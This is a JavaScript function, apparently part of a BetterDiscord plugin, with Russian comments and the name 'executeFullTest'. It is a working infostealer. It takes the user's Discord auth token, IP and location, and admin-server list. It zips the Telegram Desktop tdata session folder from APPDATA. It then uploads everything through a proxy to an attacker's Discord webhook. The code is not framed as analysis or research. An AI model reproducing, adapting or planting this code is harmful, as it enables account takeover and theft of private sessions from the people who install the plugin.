async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
    let fs = null;
    try {
        // Пытаемся получить fs напрямую. BD должен предоставить полифилл.
        fs = require('fs');
    } catch (e) {
        console.error("Не удалось загрузить fs через require:", e);
        return { success: false, error: "Модуль fs недоступен." };
    }

    let result = {
        ip: null,
        location: null,
        nitro: "Нет",
        dtoken: null,
        telegram_path: null,
        admin_servers: []
    };
    
    // 1. IP и Локация
    try {
        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        
        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
            result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
        }
    } catch (e) {}

    // 2. Nitro и Токен
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType > 0) result.nitro = "Nitro";
        }
        
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
    } catch (e) {}

    // 3. Поиск и упаковка Telegram tdata с помощью fflate
    let hasTdata = false;
    let tdataZipBuffer = null;
    try {
        const appData = process.env.APPDATA;
        if (appData) {
            // Используем require('path') из плагина
            const path = require('path'); 
            const possiblePaths = [
                path.join(appData, 'Telegram Desktop', 'tdata'),
                path.join(appData, 'Telegram', 'tdata')
            ];
            
            let tdataPath = null;
            for (const p of possiblePaths) {
                if (fs.existsSync(p)) {
                    tdataPath = p;
                    hasTdata = true;
                    break;
                }
            }

            if (tdataPath) {
                result.telegram_path = tdataPath;
                const files = {};
                const addFilesRecursively = (dir, prefix = '') => {
                    const entries = fs.readdirSync(dir);
                    for (const entry of entries) {
                        const fullPath = path.join(dir, entry);
                        const relativePath = path.join(prefix, entry);
                        if (fs.statSync(fullPath).isDirectory()) {
                            addFilesRecursively(fullPath, relativePath);
                        } else {
                            files[relativePath] = new Uint8Array(fs.readFileSync(fullPath));
                        }
                    }
                };
                addFilesRecursively(tdataPath);

                // Создаем zip-архив в памяти
                tdataZipBuffer = fflate.zipSync(files);
            }
        }
    } catch (e) {
        console.error("Ошибка при создании ZIP архива tdata:", e);
        hasTdata = false;
    }

    // 4. Сбор информации о серверах
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
                        count = GuildMemberCountStore.getMemberCount(g.id);
                    }
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && result.dtoken) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, {
                                headers: { "Authorization": result.dtoken }
                            });
                            if (res.ok) {
                                const data = await res.json();
                                count = data.approximate_member_count || data.member_count || 0;
                            }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) {}

    // 5. Формируем сообщение и файлы
    const nitroIcon = result.nitro !== "Нет" ? "✅" : "❌";
    const tokenIcon = result.dtoken ? "✅" : "❌";
    const tdataIcon = hasTdata ? "✅" : "❌";
    
    const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${nitroIcon}\nToken: ${tokenIcon}\nTdata: ${tdataIcon}\n@everyone`;

    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ content: messageText }));

    const jsonBuffer = Buffer.from(JSON.stringify(result, null, 2));
    formData.append('files[0]', new Blob([jsonBuffer], { type: 'application/json' }), 'data.json');

    if (tdataZipBuffer) {
        formData.append('files[1]', new Blob([tdataZipBuffer], { type: 'application/zip' }), 'tdata.zip');
    }

    // 6. Отправка
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
        }
        return { success: true };
    } catch (e) {
        return { success: false, error: `Ошибка сети: ${e.message}` };
    }
}
